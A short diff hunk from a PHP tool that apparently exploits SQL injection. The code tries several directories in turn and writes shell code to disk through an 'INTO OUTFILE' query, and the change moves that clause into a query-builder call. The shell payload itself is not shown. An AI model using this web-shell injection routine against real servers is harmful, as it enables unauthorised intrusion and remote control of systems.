@@ -777,7 +777,7 @@
 						foreach($shellDirLocations as $shellDirLocation){
 
 							$this->log("Trying to inject shell in \"$shellDirLocation\"",0,"white");
-							$outFile		=	"INTO OUTFILE '$shellDirLocation'";
+							$this->_queryBuilder->toOutFile($shellDirLocation);
 
 							$injection	=	$this->generateInjection($shellCode,$outFile);
 
